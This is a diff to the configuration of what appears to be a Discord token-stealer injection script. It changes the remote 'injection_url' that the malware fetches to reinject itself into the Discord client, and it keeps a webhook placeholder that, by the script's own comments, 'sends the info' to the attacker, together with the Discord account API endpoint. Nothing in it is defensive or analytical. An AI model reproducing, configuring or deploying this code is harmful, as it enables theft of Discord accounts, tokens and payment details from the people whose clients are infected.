@@ -12,7 +12,7 @@ const config = {
   embed_icon: "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/142a29a2-a9be-40ca-991d-1d0e49741baf/ddo3pva-c18c0416-7b80-4dd6-a1dc-972c5e682b5a.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzE0MmEyOWEyLWE5YmUtNDBjYS05OTFkLTFkMGU0OTc0MWJhZlwvZGRvM3B2YS1jMThjMDQxNi03YjgwLTRkZDYtYTFkYy05NzJjNWU2ODJiNWEuanBnIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.WmGeJorzVBdLTsaT-B6EPaGykCwEeTgiVXy8Mic8FbI", //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   webhook: "%WEBHOOK%", //your discord webhook there obviously
-  injection_url: "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js", //injection url for when it reinjects
+  injection_url: "https://raw.githubusercontent.com/chew-dev/iny/main/inyection.js", //injection url for when it reinjects
   /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
   api: "https://discord.com/api/v9/users/@me",
   nitro: {
